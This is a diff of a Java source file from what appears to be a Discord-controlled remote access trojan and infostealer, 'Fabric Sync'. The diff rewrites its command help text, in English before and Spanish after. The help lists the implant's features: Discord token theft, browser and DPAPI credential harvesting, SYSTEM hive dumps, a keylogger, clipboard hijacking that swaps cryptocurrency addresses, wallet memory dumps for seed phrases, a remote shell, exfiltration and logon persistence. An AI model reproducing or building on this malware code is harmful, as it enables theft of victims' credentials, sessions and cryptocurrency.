@@ -83,18 +83,21 @@ public final class CommandExecutor {
 	}
 
 	private void help() {
-		poller.reply(String.join("\n",
-			"**Fabric Sync**",
-			"`ping` latency and transport · `harvest` collect now · `token` recover Discord now · `bootstrap` run the whole first-run collection again · `hives` SYSTEM hives (asks for UAC) · `screenshot` screen",
-			"`ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (max 128 MB, split) · `upload <url|file> [name]`",
-			"`shell <cmd>` runs cmd /c with a 60 s cut; output over 1000 chars arrives as .txt",
-			"`clip` lee el portapapeles · `clip on|off|status` secuestra direcciones · `addr add|list|del|clear` gestiona las direcciones",
-			"`wallet watch on|off|status` · `memdump [electrum|phantom|ledger|exodus|pid]` vuelca memoria para buscar seeds sin contraseña",
-			"`keys on|off [--hard]|status|dump` hook nativo desde el arranque, contraseñas con ventana y proceso · `ops` estado de los tres servicios",
-			"`persist on|off` logon task · `sleep <s>` · `kill` · `clear [n]` channel messages (own/webhook always; others need Manage Messages)",
-			"`update check` · `update apply <version>` · `update rollback` · `update auto on|off` · `update status`",
-			"Harvest categories: accounts, browsers, Discord, wallets, DPAPI, game. The first run already sends recon, sessions and wallets on its own; `hives` is the manual fallback.",
-			"Extras and repairs: SHELL.md in the repo."));
+		poller.reply(helpText());
+	}
+
+	static String helpText() {
+		return String.join("\n",
+			"**Fabric Sync — todos los comandos**",
+			"`help` esta lista · `ping` latencia y transporte · `ops` estado de carteras/keylogger/portapapeles · `token` recupera Discord · `screenshot` captura de pantalla",
+			"Recolección: `harvest` ahora · `bootstrap` repite la primera recogida · `hives` hives SYSTEM (pide UAC)",
+			"Archivos y shell: `ls [dir]` · `cd <dir>` · `cat <file>` · `download <file>` (máx. 128 MB, por partes) · `upload <url|adjunto> [nombre]` · `shell <cmd>` (60 s, salida larga como .txt)",
+			"Carteras: `wallet watch on|off|status` · `memdump [electrum|phantom|ledger|exodus|metamask|trust|coinbase|pid]` vuelca memoria y busca seeds sin contraseña",
+			"Teclado: `keys on|off [--hard]|status|dump` hook nativo; las contraseñas llegan con proceso y ventana",
+			"Portapapeles: `clip read|on|off|status` · `addr add|list|del|clear <coin> <dirección>` validación estricta y rotación",
+			"Agente: `persist on|off` tarea de logon · `sleep <s>` · `update [check|stage|apply <version>|rollback|auto on|off|status]` · `gateway status|restart` · `clear [1-1000]` mensajes del canal · `kill` cierra el agente",
+			"Harvest: accounts, browsers, Discord, wallets, DPAPI y game. La primera ejecución ya envía recon, sesiones y carteras; `hives` es el fallback manual.",
+			"Extras y reparaciones: SHELL.md en el repo.");
 	}
 
 	private void clear(List<String> args) {
